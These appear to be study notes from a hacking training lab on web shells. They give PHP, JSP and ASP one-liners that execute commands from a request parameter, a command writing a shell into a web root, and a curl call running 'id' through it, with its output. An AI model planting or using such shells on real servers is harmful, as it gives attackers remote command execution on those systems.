```php
<?php system($_REQUEST["cmd"]); ?>
```


```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

## Web Root Location
![[Pasted image 20250320072023.png]]

Example:
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

#### Accessing Web Shell

Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

http://SERVER_IP:PORT/shell.php?cmd=id

![[write_shell_exec_1.webp]]

Other way:
```shell-session
shakir0x00@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```